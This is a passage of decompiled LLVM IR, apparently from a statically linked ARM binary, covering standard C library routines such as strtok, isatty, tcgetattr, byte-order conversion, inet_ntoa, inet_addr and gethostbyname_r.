  br i1 %v2_11de4, label %dec_label_pc_11df4, label %dec_label_pc_11dfc

dec_label_pc_11e10:                               ; preds = %dec_label_pc_11dfc
  %v2_11de824.in = zext i8 %v2_11de824.in.in to i32
  %v3_11dfc = zext i8 %v2_11dfc to i32
  %v2_11e08 = mul nuw nsw i32 %v3_11dfc, 2
  %v2_11de824 = mul nuw nsw i32 %v2_11de824.in, 2
  %v2_11e14 = load i32, i32* bitcast (i32** @global_var_23ae8.704 to i32*), align 4
  %v2_11e18 = add i32 %v2_11e14, %v2_11e08
  %v2_11e1c = add i32 %v2_11e14, %v2_11de824
  %v1_11e20 = add i32 %v2_11e1c, 1
  %v2_11e20 = inttoptr i32 %v1_11e20 to i8*
  %v3_11e20 = load i8, i8* %v2_11e20, align 1
  %v4_11e20 = zext i8 %v3_11e20 to i32
  %v1_11e24 = add i32 %v2_11e18, 1
  %v2_11e24 = inttoptr i32 %v1_11e24 to i8*
  %v3_11e24 = load i8, i8* %v2_11e24, align 1
  %v4_11e24 = zext i8 %v3_11e24 to i32
  %v3_11e28 = inttoptr i32 %v2_11e18 to i8*
  %v4_11e28 = load i8, i8* %v3_11e28, align 1
  %v6_11e28 = zext i8 %v4_11e28 to i32
  %v3_11e2c = inttoptr i32 %v2_11e1c to i8*
  %v4_11e2c = load i8, i8* %v3_11e2c, align 1
  %v6_11e2c = zext i8 %v4_11e2c to i32
  %v3_11e30 = mul nuw i32 %v4_11e20, 16777216
  %v3_11e34 = mul nuw i32 %v4_11e24, 16777216
  %v4_11e38 = sdiv i32 %v3_11e30, 65536
  %v5_11e38 = or i32 %v6_11e2c, %v4_11e38
  %v4_11e3c = sdiv i32 %v3_11e34, 65536
  %v5_11e3c = or i32 %v4_11e3c, %v6_11e28
  %v9_11e40 = icmp eq i32 %v5_11e38, %v5_11e3c
  br i1 %v9_11e40, label %dec_label_pc_11de0.backedge, label %dec_label_pc_11e48

dec_label_pc_11e48:                               ; preds = %dec_label_pc_11e10
  %v1_11e48 = add i32 %v0_11df4.ph, 1
  %v2_11e4c = icmp eq i8 %v2_11dfc, 0
  br i1 %v2_11e4c, label %dec_label_pc_11e5c, label %dec_label_pc_11de0.outer

dec_label_pc_11e5c:                               ; preds = %dec_label_pc_11e48
  ret i32 0

; uselistorder directives
  uselistorder i8 %v2_11de0, { 2, 1, 0 }
  uselistorder i8 %v2_11dfc, { 0, 2, 1 }
  uselistorder i32 %v0_11e0422, { 1, 0 }
  uselistorder i32 %v0_11df4.ph, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11de0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_11dfc, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_29b54.707 to i32), i32* @r2, align 4
  %v0_11e6c = call i32 @strtok_r()
  %v0_11e70 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11e70, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v1_11e70 = load i32, i32* @r2, align 4
  %v2_11e70 = load i32, i32* @r4, align 4
  %v3_11e70 = load i32, i32* @fp, align 4
  %v8_11e70 = ashr i32 %v2_11e70, %v3_11e70
  %v9_11e70 = and i32 %v8_11e70, %v1_11e70
  store i32 %v9_11e70, i32* @sb, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_11e6c

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %v2_11e78 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_11e78, i32* @r1, align 4
  %v0_11e80 = call i32 @__GI_tcgetattr()
  %v1_11e84 = sub i32 1, %v0_11e80
  %v2_11e84 = icmp ult i32 %v0_11e80, 2
  br i1 %v2_11e84, label %bb4, label %bb

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_11e90 = phi i32 [ %v1_11e84, %entry ], [ 0, %bb ]
  ret i32 %v5_11e90

; uselistorder directives
  uselistorder i32 %v0_11e80, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_11e94 = load i32, i32* @r4, align 4
  %v6_11e94 = load i32, i32* @r5, align 4
  %v2_11e98 = ptrtoint i32* %stack_var_-56 to i32
  %v0_11e9c = load i32, i32* @r1, align 4
  store i32 %v0_11e9c, i32* %r6.global-to-local, align 4
  %v0_11ea8 = load i32, i32* @r0, align 4
  %v3_11ea8 = call i32 @ioctl(i32 %v0_11ea8, i32 21505, i32 %v2_11e98)
  store i32 %v3_11ea8, i32* %r7.global-to-local, align 4
  %v2_11eac = icmp eq i32 %v3_11ea8, 0
  %v2_11eb4 = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_11eb4, i32* @r1, align 4
  %v0_11ebc = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_11eac, label %dec_label_pc_11ec4, label %dec_label_pc_11ef0

dec_label_pc_11ec4:                               ; preds = %entry
  %v1_11ebc = add i32 %v0_11ebc, 17
  %v4_11ecc = zext i8 %tmp to i32
  store i32 %v4_11ecc, i32* @r5, align 4
  %v2_11ed0 = load i32, i32* %stack_var_-56, align 4
  %v1_11ed4 = inttoptr i32 %v0_11ebc to i32*
  store i32 %v2_11ed0, i32* %v1_11ed4, align 4
  %v3_11ed4 = add i32 %v0_11ebc, 4
  %v4_11ed4 = inttoptr i32 %v3_11ed4 to i32*
  %v5_11ed4 = load i32, i32* @ip, align 4
  store i32 %v5_11ed4, i32* %v4_11ed4, align 4
  %v6_11ed4 = add i32 %v0_11ebc, 8
  %v7_11ed4 = inttoptr i32 %v6_11ed4 to i32*
  %v8_11ed4 = load i32, i32* @lr, align 4
  store i32 %v8_11ed4, i32* %v7_11ed4, align 4
  %v0_11ed8 = load i32, i32* @r4, align 4
  %v1_11ed8 = load i32, i32* %r6.global-to-local, align 4
  %v2_11ed8 = add i32 %v1_11ed8, 12
  %v3_11ed8 = inttoptr i32 %v2_11ed8 to i32*
  store i32 %v0_11ed8, i32* %v3_11ed8, align 4
  %v0_11edc = load i32, i32* @r5, align 4
  %v1_11edc = trunc i32 %v0_11edc to i8
  %v2_11edc = load i32, i32* %r6.global-to-local, align 4
  %v3_11edc = add i32 %v2_11edc, 16
  %v4_11edc = inttoptr i32 %v3_11edc to i8*
  store i8 %v1_11edc, i8* %v4_11edc, align 1
  %v4_11ee0 = call i32 @__GI_mempcpy(i32 %v1_11ebc, i32 %v2_11eb4, i32 19, i32 %v2_11ed0)
  %v0_11ee4 = load i32, i32* %r7.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_11eec = inttoptr i32 %v4_11ee0 to i8*
  %v3_11eec = call i32 @__GI_memset(i8* %v2_11eec, i32 %v0_11ee4)
  br label %dec_label_pc_11ef0

dec_label_pc_11ef0:                               ; preds = %entry, %dec_label_pc_11ec4
  %v0_11ef0 = phi i32 [ %v3_11ea8, %entry ], [ %v0_11ee4, %dec_label_pc_11ec4 ]
  store i32 %v3_11e94, i32* @r4, align 4
  store i32 %v6_11e94, i32* @r5, align 4
  ret i32 %v0_11ef0

; uselistorder directives
  uselistorder i32 %v0_11ebc, { 2, 1, 0, 3 }
  uselistorder i32 19, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11ef0, { 1, 0 }
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_11f08 = and i32 %arg1, ptrtoint (i32* @global_var_ff00.45 to i32)
  %v1_11f04 = udiv i32 %arg1, 256
  %v3_11f0c = and i32 %v1_11f04, 65280
  %v3_11f10 = mul i32 %v1_11f08, 256
  %v4_11f14 = mul i32 %arg1, 16777216
  %v5_11f14 = or i32 %v3_11f10, %v4_11f14
  %v4_11f18 = udiv i32 %arg1, 16777216
  %v5_11f18 = or i32 %v3_11f0c, %v4_11f18
  %v2_11f1c = or i32 %v5_11f14, %v5_11f18
  ret i32 %v2_11f1c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_11f2c = and i32 %tmp, and (i32 ptrtoint (i32* @global_var_ff00.45 to i32), i32 16776960)
  %tmp1 = udiv i32 %arg1, 256
  %v4_11f30 = urem i32 %tmp1, 256
  %v5_11f30 = or i32 %v4_11f30, %v1_11f2c
  ret i32 %v5_11f30

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_11f40 = and i32 %arg1, ptrtoint (i32* @global_var_ff00.45 to i32)
  %v1_11f3c = udiv i32 %arg1, 256
  %v3_11f44 = and i32 %v1_11f3c, 65280
  %v3_11f48 = mul i32 %v1_11f40, 256
  %v4_11f4c = mul i32 %arg1, 16777216
  %v5_11f4c = or i32 %v3_11f48, %v4_11f4c
  %v4_11f50 = udiv i32 %arg1, 16777216
  %v5_11f50 = or i32 %v3_11f44, %v4_11f50
  %v2_11f54 = or i32 %v5_11f4c, %v5_11f50
  ret i32 %v2_11f54

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_11f64 = and i32 %tmp, and (i32 ptrtoint (i32* @global_var_ff00.45 to i32), i32 16776960)
  %tmp1 = udiv i32 %arg1, 256
  %v4_11f68 = urem i32 %tmp1, 256
  %v5_11f68 = or i32 %v4_11f68, %v1_11f64
  ret i32 %v5_11f68

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v3_11f70 = load i32, i32* @r4, align 4
  %v6_11f70 = load i32, i32* @r5, align 4
  %v9_11f70 = load i32, i32* @r6, align 4
  %v0_11f74 = load i32, i32* @r0, align 4
  %v1_11f78 = and i32 %v0_11f74, ptrtoint (i32* @global_var_ff00.45 to i32)
  %v1_11f74 = udiv i32 %v0_11f74, 256
  %v3_11f7c = and i32 %v1_11f74, 65280
  %v3_11f80 = mul i32 %v1_11f78, 256
  %v4_11f84 = mul i32 %v0_11f74, 16777216
  %v5_11f84 = or i32 %v3_11f80, %v4_11f84
  %v4_11f88 = udiv i32 %v0_11f74, 16777216
  %v5_11f88 = or i32 %v3_11f7c, %v4_11f88
  %v2_11f94 = or i32 %v5_11f84, %v5_11f88
  %v0_11f98 = load i32, i32* @r1, align 4
  %v1_11f98 = add i32 %v0_11f98, 15
  store i32 %v1_11f98, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11fc4

dec_label_pc_11fa4:                               ; preds = %dec_label_pc_11fc4
  %v1_11fc8 = urem i32 %v0_11fd8, 256
  store i32 0, i32* %ip.global-to-local, align 4
  %v5_11fac = inttoptr i32 %v0_11fe4 to i8*
  %v6_11fac = call i32 @_uintmaxtostr(i8* %v5_11fac, i32 %v1_11fc8, i32 0, i32 -10, i32 0)
  %v0_11fb0 = load i32, i32* @r6, align 4
  %v2_11fb0 = icmp eq i32 %v0_11fb0, 0
  %v1_11fb4 = add i32 %v6_11fac, -1
  store i32 %v1_11fb4, i32* %ip.global-to-local, align 4
  br i1 %v2_11fb0, label %dec_label_pc_11fc4.backedge, label %bb

dec_label_pc_11fc4.backedge:                      ; preds = %bb, %dec_label_pc_11fa4
  %storemerge.pre = phi i32 [ %storemerge.pre.pre, %bb ], [ %v1_11fb4, %dec_label_pc_11fa4 ]
  %v0_11fc4.pre = load i32, i32* @r5, align 4
  %v0_11fc8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11fc4

bb:                                               ; preds = %dec_label_pc_11fa4
  %v4_11fbc = inttoptr i32 %v0_11fb0 to i8*
  store i8 46, i8* %v4_11fbc, align 1
  %storemerge.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11fc4.backedge

dec_label_pc_11fc4:                               ; preds = %dec_label_pc_11fc4.backedge, %entry
  %v0_11fe4 = phi i32 [ %v1_11f98, %entry ], [ %storemerge.pre, %dec_label_pc_11fc4.backedge ]
  %storemerge = phi i32 [ 0, %entry ], [ %storemerge.pre, %dec_label_pc_11fc4.backedge ]
  %v0_11fd8 = phi i32 [ %v2_11f94, %entry ], [ %v0_11fc8.pre, %dec_label_pc_11fc4.backedge ]
  %v0_11fdc = phi i32 [ 0, %entry ], [ %v0_11fc4.pre, %dec_label_pc_11fc4.backedge ]
  store i32 %storemerge, i32* @r6, align 4
  %v7_11fc4 = icmp eq i32 %v0_11fdc, 3
  store i1 %v7_11fc4, i1* @cpsr_z, align 1
  %v3_11fd8 = udiv i32 %v0_11fd8, 256
  store i32 %v3_11fd8, i32* @r4, align 4
  %v1_11fdc = add i32 %v0_11fdc, 1
  store i32 %v1_11fdc, i32* @r5, align 4
  %v7_11fe0 = icmp sgt i32 %v0_11fdc, 3
  br i1 %v7_11fe0, label %dec_label_pc_11fe4, label %dec_label_pc_11fa4

dec_label_pc_11fe4:                               ; preds = %dec_label_pc_11fc4
  %v1_11fe4 = add i32 %v0_11fe4, 1
  store i32 %v3_11f70, i32* @r4, align 4
  store i32 %v6_11f70, i32* @r5, align 4
  store i32 %v9_11f70, i32* @r6, align 4
  ret i32 %v1_11fe4

; uselistorder directives
  uselistorder i32 %v0_11fdc, { 2, 0, 1 }
  uselistorder i32 %v0_11f74, { 1, 0, 2, 3 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_29b58.710 to i32), i32* @r1, align 4
  %v0_11ff4 = call i32 @__GI_inet_ntoa_r()
  %v0_11ff8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11ff8, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v2_11ff8 = load i32, i32* @r8, align 4
  %v3_11ff8 = load i32, i32* @fp, align 4
  %v8_11ff8 = ashr i32 %v2_11ff8, %v3_11ff8
  %v9_11ff8 = and i32 %v8_11ff8, %arg1
  store i32 %v9_11ff8, i32* @sb, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_11ff4

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_12000 = ptrtoint i32* %stack_var_-8 to i32
  %v0_12008 = load i32, i32* @r0, align 4
  %v2_12008 = inttoptr i32 %v0_12008 to i8*
  %v3_12008 = call i32 @inet_aton(i8* %v2_12008, i32 %v2_12000)
  %v2_1200c = icmp eq i32 %v3_12008, 0
  br i1 %v2_1200c, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_12014 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_1201c = phi i32 [ -1, %entry ], [ %v3_12014, %bb ]
  ret i32 %v5_1201c

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_12020 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_1202c = call i32 @__GI___h_errno_location()
  %v2_12030 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_12030, i32* @ip, align 4
  %v0_1203c = load i32, i32* @r4, align 4
  %v7_1204c = call i32 @gethostbyname_r(i32 %v0_1203c, i32* nonnull @global_var_29d34.712, i32 ptrtoint (i32* @global_var_29b68.714 to i32), i32 460, i32 %v2_12030, i32 %v0_1202c)
  %v3_12050 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_12020, i32* @r4, align 4
  ret i32 %v3_12050
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_12064 = load i32, i32* @r5, align 4
  %v9_12064 = load i32, i32* @r6, align 4
  %v12_12064 = load i32, i32* @r7, align 4
  %v15_12064 = load i32, i32* @r8, align 4
  %v18_12064 = load i32, i32* @sb, align 4
  %v21_12064 = load i32, i32* @sl, align 4
  %v24_12064 = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_12074 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12074, i32* @fp, align 4
  %v2_12074 = icmp eq i32 %v0_12074, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_12084 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_12084, align 4
  br i1 %v2_12074, label %bb, label %dec_label_pc_12090

bb:                                               ; preds = %entry
  %v1_12088 = load i32, i32* %r0.global-to-local, align 4
  %v2_12088 = add i32 %v1_12088, 22
  store i32 %v2_12088, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_123b4

dec_label_pc_12090:                               ; preds = %entry
  %v0_12090 = call i32 @__errno_location()
  store i32 %v0_12090, i32* %r0.global-to-local, align 4
  %v3_12094 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_12094, i32* %ip.global-to-local, align 4
  %v1_12098 = inttoptr i32 %v0_12090 to i32*
  %v2_12098 = load i32, i32* %v1_12098, align 4
  store i32 %v2_12098, i32* @r8, align 4
  %v0_1209c = load i32, i32* @r6, align 4
  store i32 %v0_1209c, i32* %v1_12098, align 4
  %v0_120a0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_12090, i32* @r5, align 4
  %v0_120b0 = load i32, i32* @fp, align 4
  store i32 %v0_120b0, i32* %r0.global-to-local, align 4
  %v0_120b4 = load i32, i32* @sl, align 4
  store i32 %v0_120b4, i32* %r2.global-to-local, align 4
  %v0_120b8 = load i32, i32* @r7, align 4
  store i32 %v0_120b8, i32* %r3.global-to-local, align 4
  %v0_120bc = load i32, i32* @r4, align 4
  %v7_120c4 = call i32 @__get_hosts_byname_r(i32 %v0_120b0, i32 2, i32 %v0_120b4, i32 %v0_120b8, i32 %v0_120bc, i32 %v0_120a0, i32 %arg6)
  store i32 %v7_120c4, i32* %r0.global-to-local, align 4
  %v2_120c8 = icmp eq i32 %v7_120c4, 0
  br i1 %v2_120c8, label %dec_label_pc_123b4, label %dec_label_pc_120d0

dec_label_pc_120d0:                               ; preds = %dec_label_pc_12090
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_120d4 = inttoptr i32 %arg6 to i32*
  %v2_120d4 = load i32, i32* %v1_120d4, align 4
  store i32 %v2_120d4, i32* %r3.global-to-local, align 4
  %v7_120d8 = icmp eq i32 %v2_120d4, 1
  br i1 %v7_120d8, label %dec_label_pc_120fc, label %dec_label_pc_120e0

dec_label_pc_120e0:                               ; preds = %dec_label_pc_120d0
  %v7_120e0 = icmp eq i32 %v2_120d4, 4
  br i1 %v7_120e0, label %dec_label_pc_120fc, label %dec_label_pc_120e8

dec_label_pc_120e8:                               ; preds = %dec_label_pc_120e0
  %v3_120e8 = icmp eq i32 %v2_120d4, -1
  br i1 %v3_120e8, label %dec_label_pc_120f0, label %dec_label_pc_123b4

dec_label_pc_120f0:                               ; preds = %dec_label_pc_120e8
  %v0_120f0 = load i32, i32* @r5, align 4
  %v1_120f0 = inttoptr i32 %v0_120f0 to i32*
  %v2_120f0 = load i32, i32* %v1_120f0, align 4
  store i32 %v2_120f0, i32* %r3.global-to-local, align 4
  %v7_120f4 = icmp eq i32 %v2_120f0, 2
  br i1 %v7_120f4, label %dec_label_pc_120fc, label %dec_label_pc_123b4

dec_label_pc_120fc:                               ; preds = %dec_label_pc_120f0, %dec_label_pc_120e0, %dec_label_pc_120d0
  %v0_120fc = load i32, i32* @r7, align 4
  %v1_120fc = sub i32 0, %v0_120fc
  %v1_12100 = urem i32 %v1_120fc, 4
  store i32 %v1_12100, i32* %r3.global-to-local, align 4
  %v2_12100 = icmp eq i32 %v1_12100, 0
  %v0_12104 = load i32, i32* @r8, align 4
  %v1_12104 = load i32, i32* @r5, align 4
  %v2_12104 = inttoptr i32 %v1_12104 to i32*
  store i32 %v0_12104, i32* %v2_12104, align 4
  %v0_12124.pre = load i32, i32* @r4, align 4
  br i1 %v2_12100, label %dec_label_pc_1211c, label %dec_label_pc_1210c

dec_label_pc_1210c:                               ; preds = %dec_label_pc_120fc
  %v1_1210c = load i32, i32* %r3.global-to-local, align 4
  %v2_1210c = sub i32 %v0_12124.pre, %v1_1210c
  %v3_1210c = icmp ult i32 %v0_12124.pre, %v1_1210c
  br i1 %v3_1210c, label %dec_label_pc_123b0, label %dec_label_pc_12114

dec_label_pc_12114:                               ; preds = %dec_label_pc_1210c
  store i32 %v2_1210c, i32* @r4, align 4
  %v0_12118 = load i32, i32* @r7, align 4
  %v2_12118 = add i32 %v0_12118, %v1_1210c
  store i32 %v2_12118, i32* @r7, align 4
  br label %dec_label_pc_1211c

dec_label_pc_1211c:                               ; preds = %dec_label_pc_120fc, %dec_label_pc_12114
  %v0_12124 = phi i32 [ %v2_1210c, %dec_label_pc_12114 ], [ %v0_12124.pre, %dec_label_pc_120fc ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  store i32 -1, i32* %v1_120d4, align 4
  %tmp31 = icmp ult i32 %v0_12124, 4
  br i1 %tmp31, label %dec_label_pc_123b0, label %dec_label_pc_12130

dec_label_pc_12130:                               ; preds = %dec_label_pc_1211c
  %v0_12130 = load i32, i32* @r4, align 4
  %v1_12130 = add i32 %v0_12130, -4
  store i32 %v1_12130, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_12130, 8
  br i1 %tmp32, label %dec_label_pc_123b0, label %dec_label_pc_1213c

dec_label_pc_1213c:                               ; preds = %dec_label_pc_12130
  %v1_1213c = add i32 %v0_12130, -12
  store i32 %v1_1213c, i32* %r3.global-to-local, align 4
  %v0_12140 = load i32, i32* @r7, align 4
  %v1_12140 = add i32 %v0_12140, 4
  store i32 %v1_12140, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_1214c = inttoptr i32 %v1_12140 to i32*
  store i32 %v0_12140, i32* %v3_1214c, align 4
  %v0_12150 = load i32, i32* @r5, align 4
  %v1_12150 = load i32, i32* @sb, align 4
  %v2_12150 = add i32 %v1_12150, 4
  %v3_12150 = inttoptr i32 %v2_12150 to i32*
  store i32 %v0_12150, i32* %v3_12150, align 4
  %tmp33 = icmp ult i32 %v1_1213c, 32
  br i1 %tmp33, label %dec_label_pc_123b0, label %dec_label_pc_12158

dec_label_pc_12158:                               ; preds = %dec_label_pc_1213c
  %v0_12158 = load i32, i32* @r4, align 4
  %v1_12158 = add i32 %v0_12158, -44
  store i32 %v1_12158, i32* @r8, align 4
  %tmp34 = icmp ult i32 %v1_12158, 256
  br i1 %tmp34, label %dec_label_pc_123b0, label %dec_label_pc_12164

dec_label_pc_12164:                               ; preds = %dec_label_pc_12158
  %v0_12164 = load i32, i32* @r7, align 4
  %v1_12164 = add i32 %v0_12164, 44
  store i32 %v1_12164, i32* @r6, align 4
  %v1_12168 = add i32 %v0_12164, 12
  store i32 %v1_12168, i32* %r3.global-to-local, align 4
  %v0_1216c = load i32, i32* @fp, align 4
  store i32 %v0_1216c, i32* @r1, align 4
  store i32 %v1_12158, i32* %r2.global-to-local, align 4
  store i32 %v1_12164, i32* %r0.global-to-local, align 4
  %v3_1217c = call i32 @strncpy(i32 %v1_12164, i32 %v0_1216c, i32 %v1_12158)
  store i32 %v1_12168, i32* %ip.global-to-local, align 4
  %v0_12184 = load i32, i32* @r6, align 4
  %v1_12184 = load i32, i32* @r7, align 4
  %v2_12184 = add i32 %v1_12184, 12
  %v3_12184 = inttoptr i32 %v2_12184 to i32*
  store i32 %v0_12184, i32* %v3_12184, align 4
  %v0_12188 = load i32, i32* @fp, align 4
  store i32 %v0_12188, i32* %r0.global-to-local, align 4
  %v0_1218c = load i32, i32* @r5, align 4
  %v1_1218c = load i32, i32* %ip.global-to-local, align 4
  %v2_1218c = add i32 %v1_1218c, 4
  %v3_1218c = inttoptr i32 %v2_1218c to i32*
  store i32 %v0_1218c, i32* %v3_1218c, align 4
  %v0_12190 = load i32, i32* @r7, align 4
  %v2_12194 = inttoptr i32 %v0_12188 to i8*
  %v3_12194 = call i32 @inet_aton(i8* %v2_12194, i32 %v0_12190)
  store i32 %v3_12194, i32* %r0.global-to-local, align 4
  %v2_12198 = icmp eq i32 %v3_12194, 0
  br i1 %v2_12198, label %dec_label_pc_121dc, label %dec_label_pc_121a4

dec_label_pc_121a4:                               ; preds = %dec_label_pc_12164
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_121a8 = load i32, i32* @sl, align 4
  %v2_121a8 = add i32 %v1_121a8, 8
  %v3_121a8 = inttoptr i32 %v2_121a8 to i32*
  store i32 2, i32* %v3_121a8, align 4
  %v0_121ac = load i32, i32* %r3.global-to-local, align 4
  %v2_121ac = mul i32 %v0_121ac, 2
  %v1_121b0 = load i32, i32* @sl, align 4
  %v2_121b0 = add i32 %v1_121b0, 12
  %v3_121b0 = inttoptr i32 %v2_121b0 to i32*
  store i32 %v2_121ac, i32* %v3_121b0, align 4
  %v3_121b4 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_121b4, i32* %r2.global-to-local, align 4
  store i32 %v1_12168, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @ip, align 4
  %v0_121c0 = load i32, i32* @r5, align 4
  store i32 %v0_121c0, i32* %r0.global-to-local, align 4
  %v0_121c4 = load i32, i32* @sl, align 4
  %v2_121c4 = inttoptr i32 %v3_121b4 to i32*
  store i32 %v0_121c4, i32* %v2_121c4, align 4
  %v0_121c8 = load i32, i32* @r6, align 4
  %v1_121c8 = load i32, i32* @sl, align 4
  %v2_121c8 = inttoptr i32 %v1_121c8 to i32*
  store i32 %v0_121c8, i32* %v2_121c8, align 4
  %v0_121cc = load i32, i32* @sb, align 4
  %v1_121cc = load i32, i32* @sl, align 4
  %v2_121cc = add i32 %v1_121cc, 16
  %v3_121cc = inttoptr i32 %v2_121cc to i32*
  store i32 %v0_121cc, i32* %v3_121cc, align 4
  %v0_121d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_121d0 = load i32, i32* @sl, align 4
  %v2_121d0 = add i32 %v1_121d0, 4
  %v3_121d0 = inttoptr i32 %v2_121d0 to i32*
  store i32 %v0_121d0, i32* %v3_121d0, align 4
  %v0_121d4 = load i32, i32* @r5, align 4
  %v1_121d4 = load i32, i32* @ip, align 4
  %v2_121d4 = inttoptr i32 %v1_121d4 to i32*
  store i32 %v0_121d4, i32* %v2_121d4, align 4
  br label %dec_label_pc_123b4

dec_label_pc_121dc:                               ; preds = %dec_label_pc_12164
  %v2_121dc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_121dc, i32* @r5, align 4
  %v1_121e0 = call i32 @__open_nameservers(i32 0)
  store i32 ptrtoint (i32* @global_var_23af0.716 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_121dc, i32* @r0, align 4
  store i32 79836, i32* %r3.global-to-local, align 4
  %v1_121f8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_137d4.591 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23af0.716 to i32), i32* %r0.global-to-local, align 4
  %v1_12208 = call i32 @__pthread_return_0()
  store i32 %v2_121dc, i32* @r0, align 4
  %v2_12214 = load i32, i32* @global_var_29e6c.721, align 4
  store i32 %v2_12214, i32* @r4, align 4
  store i32 79836, i32* %r3.global-to-local, align 4
  %v1_12224 = call i32 @__pthread_return_void()
  %v2_12230 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_29e60.724 to i32), i32* %r3.global-to-local, align 4
  %v0_1223c = load i32, i32* @fp, align 4
  store i32 %v0_1223c, i32* %r0.global-to-local, align 4
  %v2_12240 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_12240, i32* @ip, align 4
  %v0_12244 = load i32, i32* @r4, align 4
  store i32 %v0_12244, i32* %r2.global-to-local, align 4
  %v6_12258 = inttoptr i32 %v0_1223c to i8*
  %v7_12258 = call i32 @__dns_lookup(i8* %v6_12258, i32 1, i32 %v0_12244, i32 ptrtoint (i32* @global_var_29e60.724 to i32), i32 %v2_12230, i32 %v2_12240)
  store i32 %v7_12258, i32* %r0.global-to-local, align 4
